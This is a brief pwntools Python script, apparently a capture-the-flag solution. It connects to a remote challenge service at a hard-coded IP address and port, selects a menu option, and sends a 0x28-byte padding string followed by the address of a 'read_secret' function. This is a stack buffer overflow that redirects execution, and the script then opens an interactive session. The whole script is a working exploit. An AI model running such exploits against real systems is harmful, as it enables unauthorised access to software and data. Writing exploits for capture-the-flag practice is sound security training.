from pwn import *

context.binary = elf = ELF('./bypassword_v1')

#pr = process()
pr = remote('94.237.63.166',48205)
pr.recvuntil(b'>>')
pr.sendline(b'2')

pr.recvuntil(b'password: ')
pr.sendline(b'A' * 0x28+p64(elf.sym['read_secret']))

pr.interactive()